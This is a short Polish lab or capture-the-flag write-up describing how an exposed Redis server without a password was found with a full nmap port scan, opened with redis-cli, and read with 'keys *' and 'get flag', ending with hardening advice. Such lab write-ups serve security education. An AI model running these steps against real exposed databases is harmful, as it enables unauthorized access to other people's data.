# Notatka z rekonesansu i eksploatacji — Redis (10.129.24.192)

  

**Data:** 2025-08-07  

**Host docelowy:** `10.129.24.192`  

**Adres źródłowy (tun0):** `10.10.14.152`  

**Cel:** Identyfikacja podatności i pozyskanie flagi (prawdopodobnie środowisko CTF)

  

---

  

## 🔎 1. Skanowanie portów (Nmap)

  

**Domyślny skan (`nmap 10.129.24.192`)** nie wykazał otwartych portów — skan obejmował jedynie 1000 najczęstszych portów TCP.  

  

Aby wykryć niestandardowe usługi, wykonano pełny skan portów:

  

```bash

nmap -p- -sV 10.129.24.192

```

  

**Wynik:**

```

PORT     STATE SERVICE VERSION

6379/tcp open  redis   Redis key-value store 5.0.7

```

  

---

  

## 🔌 2. Połączenie z Redisem (brak autoryzacji)

  

Redis działał na porcie 6379 **bez wymagania hasła**:

  

```bash

redis-cli -h 10.129.24.192 -p 6379

```

  

---

  

## 📦 3. Przegląd zawartości bazy Redis

  

Po wejściu do bazy (domyślnie `db0`):

  

```redis

select 0

keys *

```

  

Znalezione klucze:

```

1) "temp"

2) "stor"

3) "numb"

4) "flag"

```

  

---

  

## 🏁 4. Eksfiltracja flagi

  

Zawartość klucza `flag`:

  

```redis

get flag

"03e1d2b376c37ab3f5319922053953eb"

```

  

---

  

## ✅ Wnioski

  

- Redis był dostępny publicznie (brak firewall lub expose do internetu).

- Nie skonfigurowano hasła (`requirepass`), co pozwoliło na bezpośredni dostęp.

- W bazie danych znajdowała się wrażliwa informacja (`flag`), możliwa do odczytu bez uwierzytelnienia.

  

---

  

## 🛡️ Rekomendacje bezpieczeństwa

  

1. **Zamknąć port Redis (6379)** dla ruchu z zewnątrz.

2. Włączyć autoryzację (`requirepass`) i ewentualnie ACL (`user default off`).

3. Uruchamiać Redis tylko na `127.0.0.1`, za proxy lub VPN.

4. Nie przechowywać wrażliwych danych bez szyfrowania i kontroli dostępu.